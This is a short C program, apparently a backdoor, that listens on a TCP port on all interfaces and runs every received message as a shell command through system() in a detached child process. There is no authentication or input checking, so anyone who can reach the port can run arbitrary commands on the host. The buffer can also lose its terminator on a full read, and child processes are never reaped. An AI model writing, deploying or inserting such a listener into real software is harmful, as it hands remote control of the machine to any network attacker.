#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

#include "config.h"


void spawn( char *cmd )
{
	int pid;
	if((pid = fork()) == 0)
	{
		setsid();
		system( cmd );
	}
}

int main(int argc, char const *argv[]) 
{ 
	int server_fd, new_socket; 
	struct sockaddr_in address; 

	char buffer[1024] = {0}; 
	int addrlen = sizeof(address); 
	int opt = 1;
	   
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)  { 
		perror("socket failed"); 
		exit(EXIT_FAILURE); 
	} 
	   
	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) { 
		perror("setsockopt"); 
		exit(EXIT_FAILURE); 
	} 
	
	address.sin_family = AF_INET; 
	address.sin_addr.s_addr = INADDR_ANY; 
	address.sin_port = htons( PORT ); 
	   
	if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0) { 
		perror("bind failed"); 
		exit(EXIT_FAILURE); 
	} 
	
	if (listen(server_fd, 3) < 0) { 
		perror("listen"); 
		exit(EXIT_FAILURE); 
	} 
	
	while( 1 ) {
		memset( &buffer[0], 0, sizeof(buffer) );
		if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen))<0) { 
			perror("accept"); 
			exit(EXIT_FAILURE); 
		}
		
		while( recv( new_socket, buffer, 1024, 0 ) > 0 ) {
			spawn( &buffer[0] );
		}
	} 
	
	return 0; 
} 
